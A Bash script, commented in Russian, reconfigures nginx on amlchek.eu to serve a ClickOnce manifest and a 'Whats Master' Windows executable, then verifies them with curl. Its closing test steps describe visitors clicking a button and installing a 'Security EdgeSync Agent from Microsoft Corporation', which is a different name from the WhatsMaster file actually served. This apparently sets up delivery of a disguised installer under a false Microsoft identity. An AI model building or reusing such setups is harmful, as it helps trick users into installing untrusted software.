#!/bin/bash

echo "🔧 БЫСТРОЕ ИСПРАВЛЕНИЕ ОБНАРУЖЕННЫХ ПРОБЛЕМ..."

# ============================================================
# 1. ИСПРАВЛЕНИЕ MIME ТИПА ДЛЯ CLICKONCE
# ============================================================
echo "Исправляю MIME тип для ClickOnce файлов..."

sudo tee /etc/nginx/conf.d/clickonce-mime.conf > /dev/null << 'EOF'
# ClickOnce MIME types
location ~* \.application$ {
    add_header Content-Type "application/x-ms-application";
    add_header Cache-Control "no-cache, no-store, must-revalidate";
    add_header Pragma "no-cache";
    add_header Expires "0";
    add_header Access-Control-Allow-Origin "*";
}

location ~* \.exe$ {
    add_header Content-Type "application/octet-stream";
    add_header Content-Disposition "attachment";
    add_header Cache-Control "no-cache, no-store, must-revalidate";
    add_header Access-Control-Allow-Origin "*";
}
EOF

# ============================================================
# 2. ОБНОВЛЕНИЕ NGINX КОНФИГУРАЦИИ
# ============================================================
echo "Обновляю конфигурацию nginx для amlchek.eu..."

sudo tee /etc/nginx/sites-available/amlchek.eu > /dev/null << 'EOF'
server {
    listen 80;
    server_name amlchek.eu www.amlchek.eu 69.62.126.191;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name amlchek.eu www.amlchek.eu;
    root /var/www/html;
    index index.html;

    # SSL Configuration (managed by certbot)
    ssl_certificate /etc/letsencrypt/live/amlchek.eu/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/amlchek.eu/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # ClickOnce MIME types - ВАЖНО!
    location ~* \.application$ {
        add_header Content-Type "application/x-ms-application";
        add_header Cache-Control "no-cache, no-store, must-revalidate";
        add_header Pragma "no-cache";
        add_header Expires "0";
        add_header Access-Control-Allow-Origin "*";
        add_header Access-Control-Allow-Methods "GET, OPTIONS";
    }

    location ~* \.exe$ {
        add_header Content-Type "application/octet-stream";
        add_header Content-Disposition "attachment";
        add_header Cache-Control "no-cache, no-store, must-revalidate";
        add_header Access-Control-Allow-Origin "*";
    }

    # Large file handling
    client_max_body_size 100M;
    client_body_timeout 120s;
    client_header_timeout 120s;

    # SPA routing
    location / {
        try_files $uri $uri/ /index.html;
    }

    # Enable gzip
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    # Cache static assets
    location ~* \.(css|js|png|jpg|jpeg|gif|ico|svg)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
}
EOF

# ============================================================
# 3. ПЕРЕЗАПУСК NGINX
# ============================================================
echo "Тестирую и перезапускаю nginx..."

if sudo nginx -t; then
    echo "✅ Конфигурация nginx корректна"
    sudo systemctl reload nginx
    echo "✅ nginx перезапущен"
else
    echo "❌ Ошибка в конфигурации nginx"
    sudo nginx -t
    exit 1
fi

# ============================================================
# 4. ПРОВЕРКА РЕЗУЛЬТАТОВ
# ============================================================
echo ""
echo "🧪 Проверяю исправления..."

sleep 2

# Проверяем HTTPS
HTTPS_CODE=$(curl -s -o /dev/null -w "%{http_code}" https://amlchek.eu/ 2>/dev/null || echo "000")
echo "HTTPS статус: $HTTPS_CODE"

# Проверяем ClickOnce манифест
MANIFEST_CODE=$(curl -s -o /dev/null -w "%{http_code}" https://amlchek.eu/deploy/whatsmaster.application 2>/dev/null || echo "000")
echo "ClickOnce манифест: $MANIFEST_CODE"

# Проверяем MIME тип
MIME_TYPE=$(curl -s -I https://amlchek.eu/deploy/whatsmaster.application 2>/dev/null | grep -i content-type | cut -d' ' -f2- | tr -d '\r\n')
echo "MIME тип: $MIME_TYPE"

# Проверяем EXE файл
EXE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://amlchek.eu/deploy/Whats Master-v9.1.0-win-x64.exe" 2>/dev/null || echo "000")
echo "EXE файл: $EXE_CODE"

echo ""
if [ "$HTTPS_CODE" = "200" ] && [ "$MANIFEST_CODE" = "200" ] && echo "$MIME_TYPE" | grep -q "application/x-ms-application"; then
    echo "🎉 ВСЕ ИСПРАВЛЕНИЯ ПРИМЕНЕНЫ УСПЕШНО!"
    echo ""
    echo "✅ Сайт: https://amlchek.eu/"
    echo "✅ ClickOnce: https://amlchek.eu/deploy/whatsmaster.application"
    echo "✅ MIME тип: application/x-ms-application"
    echo "✅ EXE файл: Whats Master-v9.1.0-win-x64.exe"
    echo ""
    echo "🧪 Тестирование:"
    echo "1. Откройте https://amlchek.eu/"
    echo "2. Нажмите '🚀 Запустить EdgeSync Agent'"
    echo "3. Подтвердите переход в Microsoft Edge"
    echo "4. Установите Security EdgeSync Agent от Microsoft Corporation"
else
    echo "⚠️  Некоторые проблемы остались"
    echo "HTTPS: $HTTPS_CODE, ClickOnce: $MANIFEST_CODE, MIME: $MIME_TYPE"
fi
